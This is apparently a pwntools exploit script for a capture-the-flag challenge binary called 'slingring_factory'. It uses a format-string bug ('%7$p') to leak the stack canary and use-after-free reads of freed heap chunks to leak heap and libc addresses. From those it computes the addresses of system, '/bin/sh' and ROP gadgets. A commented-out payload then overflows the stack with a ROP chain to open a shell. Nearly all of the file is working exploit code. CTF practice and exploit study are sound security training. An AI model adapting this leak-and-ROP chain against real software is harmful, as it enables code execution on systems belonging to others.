#!/usr/bin/env python3

from pwn import *

exe = ELF("slingring_factory_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")

p = process([exe.path])
# p = remote("challs.nusgreyhats.org", 35678)
def GDB():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript='''
    b*0x1894+0x555555554000
    # b*0x00005555555555bf
    # b*0x00005555555557b8


           ''')
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def add(idx,data):
    p.recvuntil(b">>")
    sl(b"2")
    sla(b"override any existing rings!",str(idx).encode("UTF-8"))
    sla(b"destination location:",data)
    sla(b"rings you want to forge (1-9):",b"9")
    sl(b"")
def delete(idx):
    p.recvuntil(b">>")
    sl(b"3")
    sla(b"you like to discard?",str(idx).encode("UTF-8"))
def recvaddr(slot):
    p.recvuntil(b">>")
    sl(b"1")
    p.recvuntil(f"Ring Slot #{slot}  |".encode("UTF-8"))
    p.recvuntil(b"| ")
    sl(b"")
    addr = u64(p.recvline()[:-1].ljust(8,b"\0"))
    return addr


# pwning lmao lmao dark bruh
def main():
    GDB()
    sla(b"s your name?",b"%7$p")
    p.recvuntil(b"Hello, ")
    canary = int(p.recvline(),16)
    log.info(f"addr: {hex(canary)}")
    add(0,b"aaaaaaa")
    delete(0)
    addr_heap = recvaddr(0)
    base_heap = addr_heap << 12 
    log.info(f"heap: {hex(addr_heap)}")

    for i in range(0,10):
        add(i,b"aaaaaaa")
    for i in range(0,8):
        delete(i)
    leak_libc = recvaddr(7)
    libc.address = leak_libc - 0x21ace0
    system_libc = libc.address + 0x50d70
    bin_sh = libc.address + 0x1d8678
    pop_rdi =libc.address +  0x000000000002a3e5
    ret = libc.address + 0x0000000000029139
    log.info(f"leak libc: {hex(leak_libc)}")
    log.info(f"base heap: {hex(base_heap)}")
    log.info(f"libc: {hex(libc.address)}")
    log.info(f"system: {hex(system_libc)}")
    log.info(f"bin/sh: {hex(bin_sh)}")

    # p.recvuntil(b">>")
    # sl(b"4")
    # p.recvuntil(b"o use (id):")
    # sl(b"0")
    # p.recvuntil(b"the spell:")
    # sl(b"".ljust(0x38,b"\0") + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_libc))
























    p.interactive()


if __name__ == "__main__":
    main()
